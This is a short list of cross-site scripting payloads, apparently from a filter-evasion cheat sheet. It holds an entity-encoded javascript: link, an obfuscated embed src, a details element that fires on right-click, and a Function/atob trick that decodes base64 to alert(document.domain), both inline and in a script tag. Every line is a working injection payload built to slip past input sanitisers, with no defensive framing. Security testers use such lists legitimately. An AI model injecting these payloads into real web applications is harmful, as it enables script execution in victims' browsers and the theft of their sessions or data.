```
<a href="javascript&#x3ax=1;alert(1)">Click
<embed src="jav&#97;scr&#105;pt&#x3a;ale&#114;t(1)">
#Right-Click on 'Details', XSS will be fired.
<details onauxclick=confirm`xss`></details>
javascript:Function`X${atob`YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==`}```
<script>
	Function`X${atob`YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==`}```
</script>
```